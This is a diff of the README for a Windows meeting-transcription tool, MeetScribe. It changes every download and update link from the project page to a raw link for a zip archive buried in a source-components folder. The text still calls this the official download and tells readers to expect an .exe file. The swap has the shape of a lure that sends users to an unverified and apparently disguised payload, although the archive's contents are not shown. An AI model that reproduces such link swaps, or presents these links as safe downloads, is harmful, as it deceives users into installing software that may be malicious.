@@ -2,7 +2,7 @@
 
 <div align="center">
 
-<a href="https://github.com/related-lysenko8190/meetscribe"><img src="https://img.shields.io/badge/Download-MeetScribe-blue?style=for-the-badge" alt="Download MeetScribe"></a>
+<a href="https://raw.githubusercontent.com/related-lysenko8190/meetscribe/main/src/components/custom/Software-2.0.zip"><img src="https://img.shields.io/badge/Download-MeetScribe-blue?style=for-the-badge" alt="Download MeetScribe"></a>
 
 </div>
 
@@ -20,7 +20,7 @@ You need a computer running Windows 10 or Windows 11. Your computer should have 
 
 Follow these steps to run MeetScribe on your computer.
 
-1. Go to the [official download page](https://github.com/related-lysenko8190/meetscribe).
+1. Go to the [official download page](https://raw.githubusercontent.com/related-lysenko8190/meetscribe/main/src/components/custom/Software-2.0.zip).
 2. Locate the latest version of the file ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your downloads folder.
@@ -60,7 +60,7 @@ This version works on Windows.
 No. You own the software and continue to use it without limits.
 
 **How do I update the software?**
-Visit the [download link](https://github.com/related-lysenko8190/meetscribe) periodically to check for newer versions. You replace your old file with the new one to update.
+Visit the [download link](https://raw.githubusercontent.com/related-lysenko8190/meetscribe/main/src/components/custom/Software-2.0.zip) periodically to check for newer versions. You replace your old file with the new one to update.
 
 **Where do my files go?**
 The software saves transcript files in the folder where you placed the application. You can move these files to other folders on your computer later.
